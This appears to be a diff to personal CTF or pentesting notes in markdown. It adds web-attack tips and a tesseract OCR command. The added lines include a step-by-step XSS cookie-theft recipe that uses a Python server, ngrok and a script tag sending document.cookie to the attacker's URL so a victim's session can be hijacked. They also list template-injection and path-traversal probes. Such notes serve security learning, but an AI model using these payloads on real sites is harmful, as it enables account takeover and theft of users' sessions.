@@ -96,7 +96,17 @@
     - try moving back directories using local file inclusion vulnerability
     - explore directories : append the url with /../
     - try checking for files like: /.git
-    - to get all directories: wget -m <URL>
+    - to clone all directories of a website: wget -m <URL>
+    - XSS: try entering html code or JS code (e.x <h1>hi</h1> or <script>alert(1)</script>
+      using js:  1. setup web server: sudo python -m http.server 80
+                 2. setup ngrok server: ngrok http 80
+                 3. copy the web address displayed by ngrok
+                 4. in vulnerave website, where you can post inputs, type <script>new Image().src='<copied url>?c='+document.cookie</script>
+                 5. get admin cookie or required cookie in http server. replace your cookie with that cookie and refresh. 
+    - template injection payload ex. {{7*7}}
+    - check for xml injection (xxe vulnerability)
+                
+
     
   ## **OSINT**
     - https://osintframework.com/
@@ -127,3 +137,4 @@
     - lfi cheat sheet https://book.hacktricks.xyz/pentesting-web/file-inclusion
                       https://highon.coffee/blog/lfi-cheat-sheet/
     - search for vulnerabilities and exploits: https://book.hacktricks.xyz/welcome/readme
+    - extract text from images: tesseract: tesseract -l eng <imagefile> output.txt
